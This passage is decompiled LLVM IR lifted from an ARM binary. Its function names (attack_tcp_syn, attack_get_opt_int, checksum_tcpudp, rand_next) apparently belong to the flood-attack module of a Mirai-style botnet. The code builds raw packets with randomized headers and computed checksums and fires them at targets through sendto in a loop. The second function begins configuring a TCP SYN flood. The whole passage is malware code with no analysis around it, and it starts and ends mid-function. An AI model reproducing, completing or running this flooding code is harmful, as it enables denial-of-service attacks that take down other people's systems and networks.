dec_label_pc_c0d0:                                ; preds = %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge, %dec_label_pc_c0bc
  %v1_c0d4 = phi i32 [ %v1_c0d4.pre, %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_c0bc ]
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v9_c0d4 = icmp eq i32 %v3_be30, %v1_c0d4
  store i1 %v9_c0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0d4, label %dec_label_pc_c248, label %dec_label_pc_c0dc

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge, %dec_label_pc_c0d0
  %v1_c0e0 = phi i32 [ %v1_c0e0.pre, %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge ], [ %v1_c0d4, %dec_label_pc_c0d0 ]
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v9_c0e0 = icmp eq i32 %v3_be34, %v1_c0e0
  store i1 %v9_c0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0e0, label %dec_label_pc_c25c, label %dec_label_pc_c0e8

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge, %dec_label_pc_c0dc
  %v1_c0ec = phi i32 [ %v1_c0ec.pre, %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge ], [ %v1_c0e0, %dec_label_pc_c0dc ]
  store i32 %v6_bcbc, i32* %ip.global-to-local, align 4
  %v9_c0ec = icmp eq i32 %v6_bcbc, %v1_c0ec
  store i1 %v9_c0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ec, label %dec_label_pc_c270, label %dec_label_pc_c0f4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge, %dec_label_pc_c0e8
  %v1_c0f8 = phi i32 [ %v1_c0f8.pre, %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge ], [ %v1_c0ec, %dec_label_pc_c0e8 ]
  store i32 %v7_bcd8, i32* %r0.global-to-local, align 4
  %v9_c0f8 = icmp eq i32 %v7_bcd8, %v1_c0f8
  store i1 %v9_c0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0f8, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284, %dec_label_pc_c298
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c110 = load i32, i32* @r5, align 4
  %v3_c110 = add i32 %v2_c110, 10
  %v4_c110 = inttoptr i32 %v3_c110 to i16*
  store i16 0, i16* %v4_c110, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  store i32 %v0_c118, i32* @r0, align 4
  %v2_c11c = call i32 @checksum_generic(i32 %v0_c118, i32 20)
  %v3_c11c = trunc i32 %v2_c11c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c124 = load i32, i32* @r5, align 4
  %v4_c124 = add i32 %v3_c124, 10
  %v5_c124 = inttoptr i32 %v4_c124 to i16*
  store i16 %v3_c11c, i16* %v5_c124, align 2
  %v0_c128 = load i32, i32* @r6, align 4
  store i32 %v0_c128, i32* @r1, align 4
  %v0_c12c = load i32, i32* %r3.global-to-local, align 4
  %v1_c12c = trunc i32 %v0_c12c to i16
  %v3_c12c = add i32 %v0_c128, 16
  %v4_c12c = inttoptr i32 %v3_c12c to i16*
  store i16 %v1_c12c, i16* %v4_c12c, align 2
  %v0_c130 = load i32, i32* @fp, align 4
  store i32 %v0_c130, i32* %r2.global-to-local, align 4
  %v0_c134 = load i32, i32* @sb, align 4
  store i32 %v0_c134, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r5, align 4
  store i32 %v0_c138, i32* %r0.global-to-local, align 4
  %v4_c13c = call i32 @checksum_tcpudp(i32 %v0_c138, i32 %v0_c128, i32 %v0_c130, i32 %v0_c134)
  %v5_c13c = trunc i32 %v4_c13c to i16
  store i32 %v4_c13c, i32* %r0.global-to-local, align 4
  %v3_c140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c140, i32* %r3.global-to-local, align 4
  %v3_c144 = mul i32 %v3_c140, 32
  store i32 %v3_c144, i32* %lr.global-to-local, align 4
  %v3_c148 = load i32, i32* @r6, align 4
  %v4_c148 = add i32 %v3_c148, 16
  %v5_c148 = inttoptr i32 %v4_c148 to i16*
  store i16 %v5_c13c, i16* %v5_c148, align 2
  %v0_c14c = load i32, i32* %lr.global-to-local, align 4
  %v1_c14c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_c14c, -8
  %v5_c14c = add i32 %v0_c14c, %tmp73
  store i32 %v5_c14c, i32* %lr.global-to-local, align 4
  %v0_c150 = load i32, i32* @r6, align 4
  %v1_c150 = add i32 %v0_c150, 2
  %v2_c150 = inttoptr i32 %v1_c150 to i16*
  %v3_c150 = load i16, i16* %v2_c150, align 2
  %v4_c150 = zext i16 %v3_c150 to i32
  store i32 %v4_c150, i32* @r6, align 4
  %v1_c154 = load i32, i32* @r7, align 4
  %v2_c154 = add i32 %v1_c154, %v5_c14c
  store i32 %v2_c154, i32* @lr, align 4
  %v3_c158 = add i32 %v2_c154, 2
  %v4_c158 = inttoptr i32 %v3_c158 to i16*
  store i16 %v3_c150, i16* %v4_c158, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c164 = load i32, i32* @r5, align 4
  store i32 %v0_c164, i32* %r1.global-to-local, align 4
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v0_c16c = load i32, i32* @sl, align 4
  store i32 %v0_c16c, i32* %r2.global-to-local, align 4
  %v0_c174 = load i32, i32* @lr, align 4
  %v6_c178 = call i32 @__libc_sendto(i32 %v3_bde0, i32 %v0_c164, i32 %v0_c16c, i32 16384, i32 %v0_c174, i32 16)
  %v3_c17c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c17c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_c184 = add i32 %v3_c17c, 1
  store i32 %v1_c184, i32* %r0.global-to-local, align 4
  %v9_c188 = icmp eq i32 %v1_c184, %arg2
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c184, i32* %stack_var_-44, align 4
  %v6_c190 = icmp slt i32 %v1_c184, %arg2
  br i1 %v6_c190, label %dec_label_pc_c194, label %dec_label_pc_c2b4

dec_label_pc_c194:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c08c
  %v1_c1a8 = phi i32 [ %v1_c184, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c08c ]
  %v5_c198 = mul i32 %v1_c1a8, 24
  %v1_c19c = load i32, i32* @r7, align 4
  %v2_c19c = add i32 %v1_c19c, %v5_c198
  store i32 %v2_c19c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbec, i32* %ip.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c19c, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v4_c1a8 = mul i32 %v1_c1a8, 4
  %v5_c1a8 = add i32 %v4_c1a8, %v2_bbec
  %v6_c1a8 = inttoptr i32 %v5_c1a8 to i32*
  %v7_c1a8 = load i32, i32* %v6_c1a8, align 4
  store i32 %v7_c1a8, i32* @r5, align 4
  %v2_c1ac = icmp ugt i8 %v3_c1a4, 30
  %v7_c1ac = icmp eq i8 %v3_c1a4, 31
  store i1 %v7_c1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b0 = add i32 %v7_c1a8, 20
  store i32 %v1_c1b0, i32* @r6, align 4
  %v2_c1b4 = xor i1 %v7_c1ac, true
  %v3_c1b4 = and i1 %v2_c1ac, %v2_c1b4
  br i1 %v3_c1b4, label %dec_label_pc_c0b0, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c194
  %v1_c1b8 = add i32 %v2_c19c, 16
  %v2_c1b8 = inttoptr i32 %v1_c1b8 to i32*
  %v3_c1b8 = load i32, i32* %v2_c1b8, align 4
  %v0_c1bc = call i32 @rand_next()
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  %v3_c1c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c1c8 = mul i32 %v3_c1c0, 24
  %v1_c1cc = and i32 %v3_c1b8, 16711680
  store i32 %v1_c1cc, i32* %ip.global-to-local, align 4
  %v3_c1d0 = udiv i32 %v3_c1b8, 16777216
  %v4_c1d4 = udiv i32 %v1_c1cc, 256
  %v5_c1d4 = or i32 %v4_c1d4, %v3_c1d0
  store i32 %v5_c1d4, i32* %r2.global-to-local, align 4
  %v1_c1d8 = load i32, i32* @r7, align 4
  %v2_c1d8 = add i32 %v1_c1d8, %v5_c1c8
  store i32 %v2_c1d8, i32* %r1.global-to-local, align 4
  %v1_c1dc = and i32 %v3_c1b8, 65280
  store i32 %v1_c1dc, i32* %r3.global-to-local, align 4
  %v1_c1e0 = add i32 %v2_c1d8, 20
  %v2_c1e0 = inttoptr i32 %v1_c1e0 to i8*
  %v3_c1e0 = load i8, i8* %v2_c1e0, align 1
  %v4_c1e0 = zext i8 %v3_c1e0 to i32
  store i32 %v4_c1e0, i32* %ip.global-to-local, align 4
  %v5_c1e8 = call i32 @llvm.bswap.i32(i32 %v3_c1b8)
  %v7_c1ec = lshr i32 %v0_c1bc, %v4_c1e0
  %v8_c1ec = add i32 %v7_c1ec, %v5_c1e8
  store i32 %v8_c1ec, i32* %r2.global-to-local, align 4
  %v1_c1fc = and i32 %v8_c1ec, 65280
  store i32 %v1_c1fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v5_c208 = call i32 @llvm.bswap.i32(i32 %v8_c1ec)
  store i32 %v5_c208, i32* %r3.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c210 = load i32, i32* @r5, align 4
  %v2_c210 = add i32 %v1_c210, 16
  %v3_c210 = inttoptr i32 %v2_c210 to i32*
  store i32 %v5_c208, i32* %v3_c210, align 4
  br i1 %v2_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  %v0_c218 = call i32 @rand_next()
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_c228, i1* %cpsr_z.global-to-local, align 1
  %v1_c22c = load i32, i32* @r5, align 4
  %v2_c22c = add i32 %v1_c22c, 12
  %v3_c22c = inttoptr i32 %v2_c22c to i32*
  store i32 %v0_c218, i32* %v3_c22c, align 4
  br i1 %v9_c228, label %dec_label_pc_c234, label %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge

dec_label_pc_c218.dec_label_pc_c0d0_crit_edge:    ; preds = %dec_label_pc_c218
  %v1_c0d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0d0

dec_label_pc_c234:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0bc
  %v0_c234 = call i32 @rand_next()
  %v1_c234 = trunc i32 %v0_c234 to i16
  store i32 %v0_c234, i32* %r0.global-to-local, align 4
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v1_c23c = load i32, i32* @r4, align 4
  %v9_c23c = icmp eq i32 %v3_be30, %v1_c23c
  store i1 %v9_c23c, i1* %cpsr_z.global-to-local, align 1
  %v3_c240 = load i32, i32* @r5, align 4
  %v4_c240 = add i32 %v3_c240, 4
  %v5_c240 = inttoptr i32 %v4_c240 to i16*
  store i16 %v1_c234, i16* %v5_c240, align 2
  br i1 %v9_c23c, label %dec_label_pc_c248, label %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge

dec_label_pc_c234.dec_label_pc_c0dc_crit_edge:    ; preds = %dec_label_pc_c234
  %v1_c0e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0dc

dec_label_pc_c248:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c0d0
  %v0_c248 = call i32 @rand_next()
  %v1_c248 = trunc i32 %v0_c248 to i16
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v1_c250 = load i32, i32* @r4, align 4
  %v9_c250 = icmp eq i32 %v3_be34, %v1_c250
  store i1 %v9_c250, i1* %cpsr_z.global-to-local, align 1
  %v3_c254 = load i32, i32* @r5, align 4
  %v4_c254 = add i32 %v3_c254, 20
  %v5_c254 = inttoptr i32 %v4_c254 to i16*
  store i16 %v1_c248, i16* %v5_c254, align 2
  br i1 %v9_c250, label %dec_label_pc_c25c, label %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge

dec_label_pc_c248.dec_label_pc_c0e8_crit_edge:    ; preds = %dec_label_pc_c248
  %v1_c0ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0e8

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c0dc
  %v0_c25c = call i32 @rand_next()
  %v1_c25c = trunc i32 %v0_c25c to i16
  store i32 %v0_c25c, i32* %r0.global-to-local, align 4
  store i32 %v6_bcbc, i32* %ip.global-to-local, align 4
  %v1_c264 = load i32, i32* @r4, align 4
  %v9_c264 = icmp eq i32 %v6_bcbc, %v1_c264
  store i1 %v9_c264, i1* %cpsr_z.global-to-local, align 1
  %v3_c268 = load i32, i32* @r6, align 4
  %v4_c268 = add i32 %v3_c268, 2
  %v5_c268 = inttoptr i32 %v4_c268 to i16*
  store i16 %v1_c25c, i16* %v5_c268, align 2
  br i1 %v9_c264, label %dec_label_pc_c270, label %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge

dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge:    ; preds = %dec_label_pc_c25c
  %v1_c0f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0f4

dec_label_pc_c270:                                ; preds = %dec_label_pc_c25c, %dec_label_pc_c0e8
  %v0_c270 = call i32 @rand_next()
  %v1_c274 = load i32, i32* @r6, align 4
  %v2_c274 = add i32 %v1_c274, 4
  %v3_c274 = inttoptr i32 %v2_c274 to i32*
  store i32 %v0_c270, i32* %v3_c274, align 4
  store i32 %v7_bcd8, i32* %r0.global-to-local, align 4
  %v1_c27c = load i32, i32* @r4, align 4
  %v9_c27c = icmp eq i32 %v7_bcd8, %v1_c27c
  store i1 %v9_c27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c27c, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c284:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  %v0_c284 = call i32 @rand_next()
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  %v1_c290 = load i32, i32* @r6, align 4
  %v2_c290 = add i32 %v1_c290, 8
  %v3_c290 = inttoptr i32 %v2_c290 to i32*
  store i32 %v0_c284, i32* %v3_c290, align 4
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284
  %v0_c298 = load i32, i32* @r5, align 4
  %v1_c298 = add i32 %v0_c298, 40
  store i32 %v1_c298, i32* @r4, align 4
  store i32 %v1_c298, i32* %r0.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r8, align 4
  store i32 %v0_c2a0, i32* %r1.global-to-local, align 4
  %v2_c2a4 = call i32 @rand_alphastr(i32 %v1_c298, i32 %v0_c2a0)
  store i32 %v2_c2a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c2ac = load i32, i32* @r4, align 4
  %v3_c2ac = load i32, i32* @r8, align 4
  %v4_c2ac = add i32 %v3_c2ac, %v2_c2ac
  %v5_c2ac = inttoptr i32 %v4_c2ac to i8*
  store i8 0, i8* %v5_c2ac, align 1
  br label %dec_label_pc_c10c

dec_label_pc_c2b4:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c078
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c2b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c2b8, i32* %r0.global-to-local, align 4
  store i32 %v2_bdcc, i32* %r1.global-to-local, align 4
  %v9_c2c0 = icmp eq i32 %v2_bdcc, %v2_c2b8
  store i1 %v9_c2c0, i1* %cpsr_z.global-to-local, align 1
  %v6_c2c4 = icmp slt i32 %v2_bdcc, %v2_c2b8
  br i1 %v6_c2c4, label %dec_label_pc_c2c8, label %dec_label_pc_c078

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c2b4, %entry, %dec_label_pc_c2d4
  %v1_c2d0 = phi i32 [ %v3_bde0, %entry ], [ %v1_c2d8, %dec_label_pc_c2d4 ], [ %v2_c2b8, %dec_label_pc_c2b4 ]
  store i32 %v18_bbc0, i32* %sb.global-to-local, align 4
  store i32 %v24_bbc0, i32* %fp.global-to-local, align 4
  store i32 %v27_bbc0, i32* %lr.global-to-local, align 4
  ret i32 %v1_c2d0

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_bdf0
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v1_c2d8 = call i32 @__GI___libc_close(i32 %v3_bde0)
  store i32 %v1_c2d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c2c8

; uselistorder directives
  uselistorder i32 %v1_c2d8, { 1, 0 }
  uselistorder i32 %v0_c25c, { 1, 0 }
  uselistorder i32 %v0_c248, { 1, 0 }
  uselistorder i32 %v0_c234, { 1, 0 }
  uselistorder i32 %v5_c208, { 1, 0 }
  uselistorder i32 %v3_c1b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c184, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c14c, { 1, 0 }
  uselistorder i32 %v4_c13c, { 1, 0 }
  uselistorder i32 %v0_c08c, { 2, 1, 0 }
  uselistorder i1 %v2_c28c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_c228, { 2, 3, 1, 0 }
  uselistorder i1 %v7_c0b4, { 2, 1, 0 }
  uselistorder i32 %v1_c064, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c034, { 1, 0 }
  uselistorder i32 %v0_bfa0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bec8, { 2, 0, 1 }
  uselistorder i32 %v1_bec4, { 2, 0, 1 }
  uselistorder i32 %v1_beb4, { 1, 0 }
  uselistorder i1 %v2_be38, { 1, 0, 2, 3 }
  uselistorder i32 %v3_be2c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_be28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be24, { 1, 0, 2 }
  uselistorder i1 %v7_be10, { 1, 0 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i32 %v3_bde0, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bdcc, { 2, 1, 0 }
  uselistorder i32 %v6_bdbc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_bda8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bd20, { 0, 2, 1 }
  uselistorder i32 %v7_bcd8, { 3, 2, 1, 0 }
  uselistorder i32 %v6_bcbc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bc6c, { 1, 0 }
  uselistorder i32 %v1_bc48, { 1, 0 }
  uselistorder i32 %v6_bc40, { 1, 0 }
  uselistorder i32 %v8_bc28, { 1, 0, 2, 3 }
  uselistorder i8 %v5_bc24, { 1, 0 }
  uselistorder i32 %v6_bc04, { 1, 0 }
  uselistorder i32 %v2_bbec, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_c2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c298, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c078, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c2e4 = load i32, i32* @r4, align 4
  %v24_c2e4 = load i32, i32* @fp, align 4
  %v27_c2e4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_c310 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c310, i32* @sl, align 4
  %v0_c324 = load i32, i32* @r5, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v4_c328 = inttoptr i32 %v0_c314 to i32*
  %v5_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v4_c328, i32 2, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c340 = load i32, i32* @r4, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r0.global-to-local, align 4
  %v5_c348 = trunc i32 %v5_c328 to i8
  %v7_c34c = inttoptr i32 %v0_c340 to i32*
  %v8_c34c = call i32 @attack_get_opt_int(i32 %v0_c344, i32* %v7_c34c, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_c350 = load i32, i32* @r4, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r0.global-to-local, align 4
  %v5_c364 = inttoptr i32 %v0_c350 to i32*
  %v6_c364 = call i32 @attack_get_opt_int(i32 %v0_c360, i32* %v5_c364, i32 4, i32 64)
  %v1_c36c = urem i32 %v6_c364, 256
  %v0_c370 = load i32, i32* @r4, align 4
  store i32 %v0_c370, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c37c = load i32, i32* @r5, align 4
  store i32 %v0_c37c, i32* %r0.global-to-local, align 4
  %v6_c384 = inttoptr i32 %v0_c370 to i32*
  %v7_c384 = call i32 @attack_get_opt_int(i32 %v0_c37c, i32* %v6_c384, i32 5, i32 1)
  %v1_c390 = urem i32 %v7_c384, 256
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* %r1.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r5, align 4
  store i32 %v0_c3a0, i32* %r0.global-to-local, align 4
  %v6_c3a8 = inttoptr i32 %v0_c39c to i32*
  %v7_c3a8 = call i32 @attack_get_opt_int(i32 %v0_c3a0, i32* %v6_c3a8, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_c3b4 = load i32, i32* @r4, align 4
  store i32 %v0_c3b4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r0.global-to-local, align 4
  %v6_c3c4 = inttoptr i32 %v0_c3b4 to i32*
  %v7_c3c4 = call i32 @attack_get_opt_int(i32 %v0_c3c0, i32* %v6_c3c4, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_c3cc = load i32, i32* @r4, align 4
  store i32 %v0_c3cc, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v7_c3c4, i32* %fp.global-to-local, align 4
  %v0_c3dc = load i32, i32* @r5, align 4
  store i32 %v0_c3dc, i32* %r0.global-to-local, align 4
  %v5_c3e0 = inttoptr i32 %v0_c3cc to i32*
  %v6_c3e0 = call i32 @attack_get_opt_int(i32 %v0_c3dc, i32* %v5_c3e0, i32 16, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_c3e4 = load i32, i32* @r4, align 4
  store i32 %v0_c3e4, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r5, align 4
  store i32 %v0_c3f4, i32* %r0.global-to-local, align 4
  %v5_c3f8 = inttoptr i32 %v0_c3e4 to i32*
  %v6_c3f8 = call i32 @attack_get_opt_int(i32 %v0_c3f4, i32* %v5_c3f8, i32 17, i32 0)
  %v0_c3fc = load i32, i32* @r4, align 4
  store i32 %v0_c3fc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r0.global-to-local, align 4
  %v5_c410 = inttoptr i32 %v0_c3fc to i32*
  %v6_c410 = call i32 @attack_get_opt_int(i32 %v0_c40c, i32* %v5_c410, i32 10, i32 0)
  %v0_c414 = load i32, i32* @r4, align 4
  store i32 %v0_c414, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c424 = load i32, i32* @r5, align 4
  store i32 %v0_c424, i32* %r0.global-to-local, align 4
  %v5_c428 = inttoptr i32 %v0_c414 to i32*
  %v6_c428 = call i32 @attack_get_opt_int(i32 %v0_c424, i32* %v5_c428, i32 11, i32 0)
